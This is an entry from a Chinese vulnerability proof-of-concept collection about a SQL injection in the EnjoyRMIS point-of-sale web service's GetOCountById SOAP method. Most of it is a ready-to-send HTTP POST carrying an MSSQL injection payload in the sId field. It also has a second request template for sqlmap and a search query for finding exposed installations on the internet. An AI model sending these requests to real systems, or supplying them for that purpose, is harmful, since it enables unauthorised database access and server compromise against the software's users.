---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# EnjoyRMIS GetOCountById存在SQL注入漏洞

# 一、漏洞简介
EnjoyRMIS GetOCountById存在SQL注入漏洞,攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。

# 二、影响版本
+ EnjoyRMIS

# 三、资产测绘
+ hunter`web.body="CheckSilverlightInstalled"`
+ 特征


# 四、漏洞复现
```plain
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOCountById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOCountById xmlns="http://tempuri.org/">
      <sId>string' AND 8494 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(113)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (8494=8494) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113))) AND 'PDAF'='PDAF</sId>
    </GetOCountById>
  </soap:Body>
</soap:Envelope>
```


sqlmap

```plain
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOCountById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOCountById xmlns="http://tempuri.org/">
      <sId>string</sId>
    </GetOCountById>
  </soap:Body>
</soap:Envelope>
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gogy2b6p3055hkci>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
